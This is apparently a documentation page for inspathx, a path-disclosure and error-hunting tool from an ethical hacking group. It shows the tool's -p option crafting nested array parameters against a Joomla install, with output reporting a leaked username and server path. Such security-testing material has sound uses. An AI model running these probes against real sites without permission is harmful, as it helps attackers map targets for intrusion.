## Option: Param\_Array demo ##


Specify the number of `[]` with -p option.



```
$ ruby inspathx.rb -u http://attacker.in/joomla160x/index.php -p

missing argument: -p


$ ruby inspathx.rb -u http://attacker.in/joomla160x/index.php -p 2

option[][]=&view[][]=&Itemid[][]=&format[][]=&type[][]=&id[][]=&layout[][]=&catid[][]=&


$ ruby inspathx.rb -u http://attacker.in/joomla160x/index.php  -p 5

option[][][][][]=&view[][][][][]=&Itemid[][][][][]=&format[][][][][]=&type[][][][][]=&id[][][][][]=&layout[][][][][
]=&catid[][][][][]=&

```



### Without Param Array (-p) ###

```
$ ruby inspathx.rb -u http://attacker.in/joomla160x/index.php

=============================================================
Path Discloser (a.k.a inspathx) / Error Hunter
 (c) Aung Khant, aungkhant[at]yehg.net
  YGN Ethical Hacker Group, Myanmar, http://yehg.net/

svn co http://inspathx.googlecode.com/svn/trunk/ inspathx
=============================================================


# target: http://attacker.in/joomla160x/index.php
# source: .DUMMY
# log file: attacker.in_joomla160x_index.php__.log
# follow redirect: false
# null cookie: false
# param array: false
# total threads: 10
# time: 13:34:04 03-23-2011


# waiting for child threads to finish ..
.



# vulnerable url(s) = 0
# total requests = 1
# done at 13:34:09 03-23-2011

Send bugs, suggestions, contributions to inspathx[at]yehg.net
```

### With Param Array (-p) ###

```
$ ruby inspathx.rb -u http://attacker.in/joomla160x/index.php -p 2

=============================================================
Path Discloser (a.k.a inspathx) / Error Hunter
 (c) Aung Khant, aungkhant[at]yehg.net
  YGN Ethical Hacker Group, Myanmar, http://yehg.net/

svn co http://inspathx.googlecode.com/svn/trunk/ inspathx
=============================================================


# target: http://attacker.in/joomla160x/index.php
# source: .DUMMY
# log file: attacker.in_joomla160x_index.php__.log
# follow redirect: false
# null cookie: false
# param array: 2
# total threads: 10
# time: 13:30:22 03-23-2011


# waiting for child threads to finish ..
[*] http://attacker.in/joomla160x/index.php

.


! Username detected = attacker
! Server path extracted = /home/attacker/public_html/

# vulnerable url(s) = 1
# total requests = 1
# done at 13:30:27 03-23-2011

Send bugs, suggestions, contributions to inspathx[at]yehg.net
```